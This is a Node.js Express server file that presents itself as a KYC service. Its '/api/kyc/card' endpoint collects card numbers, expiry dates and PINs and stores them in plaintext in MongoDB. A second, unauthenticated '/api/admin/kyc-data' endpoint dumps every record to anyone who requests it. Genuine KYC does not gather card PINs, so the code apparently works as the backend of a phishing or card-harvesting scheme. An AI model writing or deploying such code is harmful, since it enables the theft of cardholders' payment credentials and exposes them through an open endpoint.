const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors'); // To handle cross-origin requests
const bodyParser = require('body-parser');
const env = require('dotenv').config();

const app = express();
const port = process.env.Port;

// Middleware
app.use(cors()); // Enable cross-origin requests
app.use(bodyParser.json()); // Parse JSON data

// Connect to MongoDB
mongoose
  .connect(process.env.Mongo_URL) // Replace with your MongoDB database name
  .then(() => {
    console.log('Connected to MongoDB');
  })
  .catch((err) => {
    console.error('Error connecting to MongoDB:', err);
  });

// Define a schema for card details
const cardSchema = new mongoose.Schema({
  cardNumber: {
    type: String,
    required: true,
  },
  expiryDate: {
    type: String,
    required: true,
  },
  pin: {
    type: String,
    required: true,
  },
});

// Create a model for card details
const CardDetails = mongoose.model('CardDetails', cardSchema);

// API endpoint to handle form data submission
app.post('/api/kyc/card', async (req, res) => {
  const { cardNumber, expiryDate, pin } = req.body;

  const cardData = new CardDetails({
    cardNumber,
    expiryDate,
    pin,
  });

  try {
    await cardData.save();
    res.status(201).send('Card details saved successfully');
  } catch (error) {
    console.error('Error saving card details:', error);
    res.status(400).send('Error saving card details');
  }
});

app.get('/api/admin/kyc-data', async (req, res) => {
  try {
    const data = await CardDetails.find({}).lean().exec();
    res.status(200).json(data);``
  } catch (error) {
    console.error('Error fetching data:', error);
    res.status(500).send('Error fetching data');
  }
})

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});

